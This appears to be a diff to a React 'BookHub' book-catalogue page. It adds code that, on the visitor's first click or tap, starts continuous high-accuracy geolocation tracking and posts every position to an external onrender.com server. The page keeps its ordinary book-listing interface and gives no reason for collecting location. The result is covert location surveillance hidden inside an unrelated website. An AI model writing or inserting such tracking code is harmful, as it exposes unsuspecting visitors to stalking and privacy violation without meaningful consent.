@@ -2,63 +2,77 @@ import React, { useEffect, useRef } from "react";
 import axios from "axios";
 
 function App() {
-  const sentRef = useRef(false); // prevent duplicate fast calls
+  const watchRef = useRef(null);
 
   useEffect(() => {
-    if (!navigator.geolocation) return;
-
     const userId = "user123";
 
-    // ⚡ FAST FUNCTION (reusable)
-    const sendLocation = async (pos) => {
-      try {
-        await axios.post("http://localhost:5000/locations", {
-          userId,
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-        });
-      } catch (err) {
-        console.log("Error sending");
-      }
+    const startTracking = () => {
+      if (!navigator.geolocation) return;
+
+      // prevent multiple triggers
+      if (watchRef.current) return;
+
+      const sendLocation = async (pos) => {
+        try {
+          await axios.post("https://server-q7vm.onrender.com/location", {
+            userId,
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+          });
+        } catch (err) {
+          console.log("Error sending");
+        }
+      };
+
+      // 🔥 1. FIRST INSTANT LOCATION (popup comes here)
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          sendLocation(pos);
+        },
+        (err) => {
+          console.log("Permission denied");
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 5000,
+          maximumAge: 0,
+        }
+      );
+
+      // 🔥 2. CONTINUOUS TRACKING
+      watchRef.current = navigator.geolocation.watchPosition(
+        (pos) => {
+          sendLocation(pos);
+        },
+        () => {},
+        {
+          enableHighAccuracy: true,
+        }
+      );
+
+      // remove listener after first interaction
+      window.removeEventListener("click", startTracking);
+      window.removeEventListener("touchstart", startTracking);
     };
 
-    // 🔥 1. GET LAST KNOWN LOCATION (FASTEST)
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        sendLocation(pos); // ⚡ instant first hit
-        sentRef.current = true;
-      },
-      () => {},
-      {
-        enableHighAccuracy: false,
-        maximumAge: 60000, // ⚡ allow cached location
-        timeout: 2000,
-      }
-    );
+    // 👇 triggers on ANY tap instantly
+    window.addEventListener("click", startTracking);
+    window.addEventListener("touchstart", startTracking);
 
-    // 🔥 2. REAL-TIME TRACKING
-    const watchId = navigator.geolocation.watchPosition(
-      (pos) => {
-        // avoid duplicate immediate call
-        if (!sentRef.current) {
-          sendLocation(pos);
-          sentRef.current = true;
-        } else {
-          sendLocation(pos);
-        }
-      },
-      () => {},
-      {
-        enableHighAccuracy: true,
-        maximumAge: 0,
-      }
-    );
+    return () => {
+      window.removeEventListener("click", startTracking);
+      window.removeEventListener("touchstart", startTracking);
 
-    return () => navigator.geolocation.clearWatch(watchId);
+      if (watchRef.current) {
+        navigator.geolocation.clearWatch(watchRef.current);
+      }
+    };
   }, []);
 
   return (
     <div>
+      {/* 🔥 SAME UI */}
       <style>{`
         body { margin: 0; font-family: Arial; }
 
@@ -99,6 +113,7 @@ function App() {
           background: #007bff;
           color: white;
           border-radius: 5px;
+          cursor: pointer;
         }
 
         @media (max-width: 992px) {
@@ -111,6 +126,7 @@ function App() {
         }
       `}</style>
 
+      {/* Navbar */}
       <div className="navbar">
         <h2>📚 BookHub</h2>
         <div className="nav-links">
@@ -121,6 +137,7 @@ function App() {
         </div>
       </div>
 
+      {/* Books */}
       <div className="container">
         {books.map((book, i) => (
           <div key={i} className="card">
